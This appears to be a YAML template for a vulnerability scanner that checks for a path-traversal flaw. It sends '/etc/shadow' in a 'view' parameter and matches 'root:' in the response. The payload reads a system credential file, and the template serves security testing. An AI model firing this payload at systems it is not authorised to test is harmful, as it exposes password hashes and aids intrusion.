id: lfi6-0806
name: 'Traversal in view'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via view'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - '/etc/shadow'
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
